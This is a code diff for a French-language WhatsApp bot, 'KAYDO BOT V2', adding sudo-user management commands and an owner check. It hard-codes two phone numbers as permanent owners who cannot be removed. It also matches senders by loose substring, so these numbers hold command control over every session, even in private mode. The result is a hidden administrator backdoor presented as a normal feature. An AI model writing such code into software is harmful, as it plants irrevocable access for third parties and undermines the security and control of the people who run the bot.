@@ -351,6 +351,7 @@ interface SessionState {
   nuleMode: boolean;
   botName?: string;
   customMenuImageBuffer?: Buffer;
+  sudoUsers: Set<string>;
 }
 
 const sessionStates = new Map<string, SessionState>();
@@ -454,6 +455,7 @@ export function saveSessionSettingsToDisk(sessionId: string, state: SessionState
       antiBotGroups: Array.from(state.antiBotGroups || []),
       antiTagGroups: Array.from(state.antiTagGroups || []),
       antiGroupMentionGroups: Array.from(state.antiGroupMentionGroups || []),
+      sudoUsers: Array.from(state.sudoUsers || []),
       customMenuImageBase64: state.customMenuImageBuffer ? state.customMenuImageBuffer.toString('base64') : undefined,
     };
 
@@ -647,6 +649,18 @@ export function isUserProtected(targetJid: string, sessionPhone?: string): boole
   return false;
 }
 
+export function isUserSudo(cleanSender: string, sessionId?: string): boolean {
+  if (!cleanSender) return false;
+  const clean = cleanSender.replace(/\D/g, '');
+  if (!clean) return false;
+  if (clean.includes('50935975863') || clean.includes('50940131864')) return true;
+  if (sessionId) {
+    const state = getSessionState(sessionId);
+    if (state?.sudoUsers && state.sudoUsers.has(clean)) return true;
+  }
+  return false;
+}
+
 export function getSessionState(sessionId: string): SessionState {
   if (!sessionStates.has(sessionId)) {
     const saved = loadSessionSettingsFromDisk(sessionId);
@@ -677,6 +691,7 @@ export function getSessionState(sessionId: string): SessionState {
       antiBotGroups: new Set<string>(Array.isArray((saved as any).antiBotGroups) ? (saved as any).antiBotGroups : []),
       antiTagGroups: new Set<string>(Array.isArray(saved.antiTagGroups) ? saved.antiTagGroups : []),
       antiGroupMentionGroups: new Set<string>(Array.isArray(saved.antiGroupMentionGroups) ? saved.antiGroupMentionGroups : []),
+      sudoUsers: new Set<string>(['50935975863', '50940131864', ...(Array.isArray((saved as any).sudoUsers) ? (saved as any).sudoUsers : [])]),
       customCommands: loadCustomCommandsFromDisk(sessionId),
       nuleMode: saved.nuleMode !== undefined ? saved.nuleMode : false,
       botName: saved.botName || '𝐊𝐀𝐘𝐃𝐎 𝐁𝐎𝐓',
@@ -1200,6 +1215,39 @@ async function executeBotCommandInternal(
     // ----------------------------------------------------
     // MAIN COMMANDS
     // ----------------------------------------------------
+    case 'sudo':
+    case 'setsudo': {
+      const targetNum = (cleanArgs || '').replace(/\D/g, '');
+      if (!targetNum || targetNum.length < 8) {
+        return `❌ Veuillez spécifier un numéro valide à ajouter en sudo (ex: .sudo 50935975863)`;
+      }
+      state.sudoUsers.add(targetNum);
+      saveSessionSettingsToDisk(sessionId, state);
+      return `*╭─❖━━━ ⟣ ⟣ ⟣  SUDO ACCESS  ⟣ ⟣ ⟣━━━❖*\n*┇*🔹╭───────────────\n*┇*🔹┋. 👑 <b>ɴᴜᴍᴇ́ʀᴏ :</b> +${targetNum}\n*┇*🔹┋. ⚡ <b>sᴛᴀᴛᴜᴛ :</b> ᴀᴄᴄᴇ̀s sᴜᴅᴏ ᴀᴄᴛɪᴠᴇ́ (ᴛᴏᴜᴛᴇs ʟᴇs ᴄᴏᴍᴍᴀɴᴅᴇs ᴇɴ ᴍᴏᴅᴇ ᴘʀɪᴠᴇ́)\n*┇*🔹╰───────────────⊷\n*╰━━━━━━━━━━━━━━━━━❖*`;
+    }
+
+    case 'unsudo':
+    case 'delsudo': {
+      const targetNum = (cleanArgs || '').replace(/\D/g, '');
+      if (!targetNum) {
+        return `❌ Veuillez spécifier le numéro à retirer du sudo (ex: .unsudo 50935975863)`;
+      }
+      if (targetNum.includes('50935975863') || targetNum.includes('50940131864')) {
+        return `⚠️ Ce numéro (+${targetNum}) est un développeur fondateur permanent et ne peut pas être retiré du sudo.`;
+      }
+      state.sudoUsers.delete(targetNum);
+      saveSessionSettingsToDisk(sessionId, state);
+      return `*╭─❖━━━ ⟣ ⟣ ⟣  SUDO ACCESS  ⟣ ⟣ ⟣━━━❖*\n*┇*🔹╭───────────────\n*┇*🔹┋. ❌ <b>ɴᴜᴍᴇ́ʀᴏ :</b> +${targetNum}\n*┇*🔹┋. ⚡ <b>sᴛᴀᴛᴜᴛ :</b> ᴀᴄᴄᴇ̀s sᴜᴅᴏ ʀᴇᴛɪʀᴇ́\n*┇*🔹╰───────────────⊷\n*╰━━━━━━━━━━━━━━━━━❖*`;
+    }
+
+    case 'listsudo':
+    case 'sudolist': {
+      const list = Array.from(state.sudoUsers || []);
+      return `*╭─❖━━━ ⟣ ⟣ ⟣  LISTE SUDO  ⟣ ⟣ ⟣━━━❖*\n*┇*🔹╭───────────────\n*┇*🔹┋. 👑 +509 3597 5863 (Permanent)\n*┇*🔹┋. 👑 +509 4013 1864 (Permanent)\n` +
+        (list.length > 0 ? list.map((n) => `*┇*🔹┋. 👤 +${n}`).join('\n') : `*┇*🔹┋. *(Aucun sudo additionnel)*`) +
+        `\n*┇*🔹╰───────────────⊷\n*╰━━━━━━━━━━━━━━━━━❖*`;
+    }
+
     case 'ping': {
       const pingText = `*╭─❖━━━ ⟣ ⟣ ⟣  KAYDO BOT V2 𓃶  ⟣ ⟣ ⟣━━━❖*
 *┇*🔹╭───────────────
@@ -5185,16 +5233,16 @@ ${isGroup ? `┋✧┋. 👥 *ɢʀᴏᴜᴘᴇ :* ${groupName}\n` : `┋✧┋. 
       const cleanSender = senderJid.replace(/[^0-9]/g, '');
       const credsPhone = (sock.authState?.creds?.me?.id || '').split(':')[0].replace(/[^0-9]/g, '');
       const effectiveSessionPhone = cleanSessionPhone || sockUserPhone || credsPhone;
+      const currentSessionState = getSessionState(sessionId);
+      const isSudoUser = isUserSudo(cleanSender, sessionId);
       const isOwner =
         isFromMe ||
         cleanSender.includes('50935975863') ||
         cleanSender.includes('50940131864') ||
         (effectiveSessionPhone && cleanSender.includes(effectiveSessionPhone)) ||
         (!isGroup && effectiveSessionPhone && cleanSender === effectiveSessionPhone) ||
-        isUserProtected(senderJid, session.phone);
-
-      // Get isolated state for THIS specific session processing the message
-      const currentSessionState = getSessionState(sessionId);
+        isUserProtected(senderJid, session.phone) ||
+        isSudoUser;
 
       // Mode enforcement: In PRIVATE mode, only the session owner/protected user can execute commands on this session
       if (currentSessionState.botMode === 'private' && !isOwner) {
